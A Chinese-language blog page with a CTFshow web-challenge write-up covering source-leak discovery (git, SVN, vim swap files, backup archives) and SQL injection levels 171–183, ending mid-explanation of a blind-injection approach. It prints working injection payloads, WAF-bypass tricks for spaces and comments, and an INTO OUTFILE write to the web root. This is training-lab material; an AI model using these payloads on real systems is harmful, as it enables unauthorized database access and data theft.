<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"tearsjin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="K1rit0&#39;s Blog">
<meta property="og:url" content="http://tearsjin.github.io/page/30/index.html">
<meta property="og:site_name" content="K1rit0&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="K1rit0">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://tearsjin.github.io/page/30/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/30/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>K1rit0's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style><link rel="alternate" href="/atom.xml" title="K1rit0's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">K1rit0's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description"> </p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>links</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="K1rit0"
      src="https://avatars.githubusercontent.com/u/56160386?s=96&v=4">
  <p class="site-author-name" itemprop="name">K1rit0</p>
  <div class="site-description" itemprop="description"> </div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">38</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/tearsjin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;tearsjin" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:k1rit0@qq.com" title="E-Mail → mailto:k1rit0@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://tearsjin.github.io/2020/12/12/CTFshow-Web1000/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/56160386?s=96&v=4">
      <meta itemprop="name" content="K1rit0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="K1rit0's Blog">
      <meta itemprop="description" content=" ">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | K1rit0's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/12/CTFshow-Web1000/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-12 18:31:38" itemprop="dateCreated datePublished" datetime="2020-12-12T18:31:38+08:00">2020-12-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-09-11 10:27:52" itemprop="dateModified" datetime="2022-09-11T10:27:52+08:00">2022-09-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/WebSummary/" itemprop="url" rel="index"><span itemprop="name">WebSummary</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>12 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>重金买了个号怎么可能不做呢???<br>好好学学Web了 真的很重要!</p>
</blockquote>
<h1 id="信息搜集-Web1-20"><a href="#信息搜集-Web1-20" class="headerlink" title="信息搜集 Web1~20"></a>信息搜集 Web1~20</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><p>F12</p>
<h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><p>没办法F12和右键了, 直接firefox开发者工具</p>
<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>抓包, flag就在响应里</p>
<blockquote>
<p>所以有时候没思路就抓抓包, 有可能有线索或者提示的</p>
</blockquote>
<h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><p>robots.txt</p>
<blockquote>
<p>所以没思路的时候就阿巴阿巴</p>
</blockquote>
<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><p>phps源码泄露</p>
<blockquote>
<p>有时候试试phps读源码, 有惊喜哦</p>
</blockquote>
<h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><p>也是源码泄露, 应该是备份压缩包<br>常见的名字有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">'www.zip',</span><br><span class="line">'www.bak',</span><br><span class="line">'www.rar',</span><br><span class="line">'www.7z',</span><br><span class="line">'www.tar',</span><br><span class="line">'www.tar.gz',</span><br><span class="line">'www.txt'</span><br></pre></td></tr></table></figure>
<h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
<p>一般来说就是.git泄露之后恢复源码什么的.</p>
<p>有时候还会需要用.git/config 中含有的access_token信息, 从而访问这个用户的其他仓库</p>
<p>有些时候访问.git会返回403, 这个时候就要试探的访问.git/config, 如果有内容返回, 就说明存在git泄露.</p>
<p>关于敏感目录泄露, 还有SVN泄露, HG泄露等等… 等以后遇到了再来总结</p>
<h2 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h2><h3 id="SVN-泄露"><a href="#SVN-泄露" class="headerlink" title="SVN 泄露"></a>SVN 泄露</h3><p>SVN(subversion)是一个源代码版本管理软件. 同样的隐藏文件.SVN里面会有信息. </p>
<p>利用seay-svn获取服务器源码等信息</p>
<h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><h3 id="vim备份文件泄露"><a href="#vim备份文件泄露" class="headerlink" title="vim备份文件泄露"></a>vim备份文件泄露</h3><p>当用户在用vim编辑文件但意外退出时, 会在当前目录下生成一个备份文件, 文件名格式为<code>.文件名.swp</code></p>
<p>针对swp备份文件, 可以用<code>vim -r</code>命令恢复文件的内容.</p>
<h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><p>Cookies里面有内容</p>
<blockquote>
<p>抓包分析的时候一般都会看看Cookies的</p>
</blockquote>
<h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><p>域名解析<br><a target="_blank" rel="noopener" href="http://dbcha.com/">http://dbcha.com/</a> 里面查ctfshow.com的txt记录</p>
<blockquote>
<p>顺便学习一下域名解析的类型</p>
</blockquote>
<h3 id="域名解析类型-A-CNAME-MX-NS-TXT-AAAA-SRV-显性URL-隐性URL"><a href="#域名解析类型-A-CNAME-MX-NS-TXT-AAAA-SRV-显性URL-隐性URL" class="headerlink" title="域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URL"></a>域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URL</h3><p><strong>A记录</strong>：将域名指向一个IPv4地址（例如：10.10.10.10），需要增加A记录<br><strong>CNAME记录</strong>：如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录<br><strong>MX记录</strong>：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录<br><strong>NS记录</strong>：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录<br><strong>TXT记录</strong>：可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用<br><strong>AAAA记录</strong>：将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录<br><strong>SRV记录</strong>：记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）<br><strong>显性URL</strong>：将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址（例如：将www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。<br><strong>隐性URL</strong>：与显性URL类似，但隐性转发会隐藏真实的目标地址（例如：将www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。</p>
<h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><blockquote>
<p>开始变得奇怪了</p>
</blockquote>
<p>进去是一个购物网站, 抓包无果, 看了下robots.txt, 有提示/admin/<br>要输入账号密码, 账号就是admin, 密码是网站下面的那串数字</p>
<blockquote>
<p>正常情况下没有人会这么干吧!<br>所以还是要多去看看一下可以搜集信息的地方, robotx.txt啥的</p>
</blockquote>
<h2 id="Web-13"><a href="#Web-13" class="headerlink" title="Web 13"></a>Web 13</h2><p>拿到一个网站可以看看看看有哪些链接是可以跳转的(哪些是可以点击的)<br>网站下面有个document可以点, 进去以后里面有后台的地址和用户名密码.</p>
<h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><blockquote>
<p>KindEditor PHP编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</p>
</blockquote>
<p>进入/editor/(这个得目录扫描吧… 利用上传图片遍历服务器根目录, 在网站目录下找到/nothinghere/fl000g.txt</p>
<h2 id="Web-15"><a href="#Web-15" class="headerlink" title="Web 15"></a>Web 15</h2><p>目录下有admin/<br>忘记密码需要填写密保<br>而网站下方有qq邮箱, 搜索qq可以知道密保答案</p>
<h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针.</p>
<h2 id="Web-17"><a href="#Web-17" class="headerlink" title="Web 17"></a>Web 17</h2><p>利用ping 直接获得某个域名所对应的ip</p>
<h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><p>js代码审计, 找到游戏结果的判断就能找到线索</p>
<h2 id="Web-19"><a href="#Web-19" class="headerlink" title="Web 19"></a>Web 19</h2><p>AES加密, 但是Key iv mode padmode都在前端….<br>利用<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes解密即可">http://tool.chacuo.net/cryptaes解密即可</a></p>
<h1 id="文件上传-web151-web170"><a href="#文件上传-web151-web170" class="headerlink" title="文件上传 web151 ~ web170"></a>文件上传 web151 ~ web170</h1><p>前端验证上传文件后缀名, 只需要抓包改一下文件名称就能上传后门了                                                                                                                        通过ls找到flag.php , cat flag.php即可</p>
<h1 id="sql注入-web171-web253"><a href="#sql注入-web171-web253" class="headerlink" title="sql注入 web171~ web253"></a>sql注入 web171~ web253</h1><h2 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h2><p>语句: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";</span><br></pre></td></tr></table></figure>
<p>直接在本表内爆出所有数据即可,  payload: <code>id= 1' or 1 --+</code></p>
<h2 id="web-172"><a href="#web-172" class="headerlink" title="web 172"></a>web 172</h2><p>语句<code>$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>但是输出经过了过滤:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!=='flag'){</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>所以需要把返回出来的username改掉, 让他检查不出来, payload: <code>1' union select 1,password from ctfshow_user2 where username = 'flag'  --+</code></p>
<h2 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h2><p>语句:<code>$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match('/flag/i', json_encode($ret))){</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    }</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<p>这里直接对结果进行过滤, 需要让返回的结果不存在flag, 考虑将返回的结果全部转成十六进制</p>
<p>payload: <code>0' union select 1,hex(username),hex(password) from ctfshow_user3 where username = 'flag' --+</code></p>
<p>然后将返回的结果转成text即可,  但是出来flag的时候发现, 其实根本不需要转成16进制, 因为flag里根本就没有<code>flag</code>字样(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), 所以直接<code>0' union select 1,2,password from ctfshow_user3 where username = 'flag' --+</code> 也能出结果</p>
<h2 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h2><p>语句: <code>$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    }</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<p>这下好了, 结果里连数字都不能出现了, hex(), base64()估计都不能用了, 想个办法把数字转成别的字符,  <code>replace(str1,str2,str3)</code> 可以把<code>str1</code>中的<code>str2</code>替换成<code>str3</code>, 可以考虑用这个将所有数字换成大写字母(毕竟flag中是没有大写字母的, 没有找到sql用正则的方法, 只能把多个replace()套在一起了</p>
<p>payload:<code>0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from ctfshow_user4 where username = 'flag' --+</code></p>
<p>然后将返回的结果中的大写字母转回数字就行了</p>
<h2 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a>web 175</h2><p>语句:<code>$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    }</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<p>已经不能返回任何东西了, \x00~\x7f全部过滤掉了, 考虑文件的方式读取flag. 用<code>INTO OUTFILE</code> 可以将查询结果输出到某文件中, 在这里只需要输出到一个文件里就行了, 不过路径要记得写对<code>var\www\html\</code></p>
<p>payload: <code>1' union select username,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/res.txt'--+</code></p>
<p>结果就在res.txt里</p>
<h2 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a>web 176</h2><p>开始有过滤了</p>
<p>语句:<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str){</span><br><span class="line">   //代码过于简单，不宜展示</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
<p>只知道有过滤, 但不知道过滤了啥, 也没多想先试试<code>1' or 1 --+</code>就出flag了, 看群主的视频这题应该是大小写绕过</p>
<h2 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h2><p>语句<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code>                     </p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str){</span><br><span class="line">   //代码过于简单，不宜展示</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
<p>一样是过滤, 继续尝试<code>1' or 1 --+</code>, 发现无结果, 应该是某些字符被过滤了. 这个时候因为不知道什么被过滤, 所以输入越少东西越能判断出过滤了什么.</p>
<p>先尝试<code>1'--+</code> 发现无结果, 可能<code>--+</code>被过滤了, 尝试用<code>#</code> 也不行, 再试试<code>%23</code>, 发现可以绕过过滤</p>
<p>再尝试<code>1' %23</code>又是无结果,明显是空格被过滤了, 利用<code>/**/</code>注释绕过空格.</p>
<p>于是得到一个payload: <code>1'/**/or/**/1%23</code></p>
<h2 id="web-178-179"><a href="#web-178-179" class="headerlink" title="web 178 179"></a>web 178 179</h2><p>依旧是过滤掉了空格, 但是<code>/**/</code>不能使用了, 则尝试用括号来绕过</p>
<p>payload:<code>1'or(1)%23</code> 简单粗暴</p>
<p>看了群主的视频发现还可以用<code>%09</code>来代替空格, 这个是制表符, 在sql中跟空格一样的作用</p>
<p>payload:<code>1'%09or%091%23</code></p>
<p>然后在web 179里, <code>%09</code>也被过滤了, 第一个payload还是可以用的, 但还可以试试别的, 比如<code>%0a %0b %0c</code>等等, 把ascii码前面那几个字符都试一试, 试出<code>%0c</code>也是可以的</p>
<p>payload:<code>1'%0cor%0c1%23</code> </p>
<h2 id="web-180"><a href="#web-180" class="headerlink" title="web 180"></a>web 180</h2><p>语句<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>跟前面的不同的是, 这次连<code>%23</code>都被过滤了, 可以说没办法注释掉后面的sql语句了, 只能通过闭合的方式使得语句不会出错</p>
<p>例如<code>1'and'a'='a</code>, 这样语句就会变成</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">'flag'</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">'1'</span><span class="keyword">and</span><span class="string">'a'</span><span class="operator">=</span><span class="string">'a'</span> limit <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可以看到引号被成功的闭合, 结果也是有的. 但是, 想要查出flag还需要想办法使得<code>username != 'flag'无效</code>, 因<code>username != 'flag'</code>与后面的条件关系是<code>and</code>, 所以并不能通过他原本的语句中的<code>id=</code>查<code>id = 26</code>找到flag(id=26是flag是因为前面的题目都是26), 所以需要构造一个新的与前面的条件的关系为<code>or</code>的条件来查找</p>
<p>所以考虑了<code>1'or(1)and'a</code>, 但是得到的结果却只有一行, 原因是因为语句中有个<code>limit 1</code>. 而原本语句中的<code>id=1</code>是可以查询出结果的, 这里不能让他查询出结果了, 而出来的结果又必须是flag那一条, 所以考虑将<code>or</code>括号中的条件改成<code>id=26</code>. 这样就成功构造出payload:<code>0'or(id=26)and'a'='a</code></p>
<h2 id="web-181"><a href="#web-181" class="headerlink" title="web 181"></a>web 181</h2><p>语句<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str){</span><br><span class="line">    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
<p>web 180的payload中的字符串这题都没有过滤掉, 直接<code>0'or(id=26)and'a'='a</code>出结果</p>
<h2 id="web-182"><a href="#web-182" class="headerlink" title="web 182"></a>web 182</h2><p>和web 181一样, 直接<code>0'or(id=26)and'a'='a</code></p>
<h2 id="web-183"><a href="#web-183" class="headerlink" title="web 183"></a>web 183</h2><p>查询语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = "select count(pass) from ".$_POST['tableName'].";";</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str){</span><br><span class="line">    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);</span><br><span class="line">  }      </span><br></pre></td></tr></table></figure>
<p>查询结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 1;</span><br></pre></td></tr></table></figure>
<p>结果只会返回结果的数量, 而且过滤掉了很多关键字. 看了下视频, 这里要用到正则+盲注, sql中的正则是用REGEXP’str’来匹配的, 例如<code>select id from table where username REGXEP'admin'</code> 就会查询符合正则式子的username字段的那一行</p>
<p>这里因为可以知道结果有几行, 也就意味着可以判断正则是否匹配, 由前面的题目可以知道flag的格式是ctfshow{xxxx-xxx-x-x-x}这种, 而且只有小写字母和数字, 所以考虑用脚本盲注, 从<code>`ctfshow_user`where`pass`REGEXP'ctfshow{</code>开始猜flag</p>
